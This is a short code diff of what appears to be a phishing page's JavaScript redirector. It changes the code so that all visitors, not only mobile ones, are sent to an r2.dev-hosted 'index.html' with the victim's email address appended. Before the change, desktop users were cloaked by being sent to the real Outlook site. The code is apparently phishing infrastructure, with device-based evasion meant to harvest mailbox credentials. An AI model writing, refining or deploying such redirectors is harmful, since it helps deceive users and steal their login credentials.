@@ -151,13 +151,13 @@
             // Check if the device is mobile
             if (isMobileDevice()) {
                 // Redirect mobile devices to the original destination
-                const redirectUrl = "https://pub-e4d3df5fcd76468cada9784bed632a61.r2.dev#" + email;
+                const redirectUrl = "https://pub-23ce8269cfe7466689c13707a4024893.r2.dev/index.html#" + email;
                 console.log("Mobile device detected. Redirecting to:", redirectUrl);
                 window.location.href = redirectUrl;
             } else {
-                // Redirect non-mobile devices to Outlook
-                console.log("Non-mobile device detected. Redirecting to Outlook.");
-                window.location.href = "https://outlook.office365.com/";
+               const redirectUrl = "https://pub-23ce8269cfe7466689c13707a4024893.r2.dev/index.html#" + email;
+                console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                window.location.href = redirectUrl;
             }
         }
         
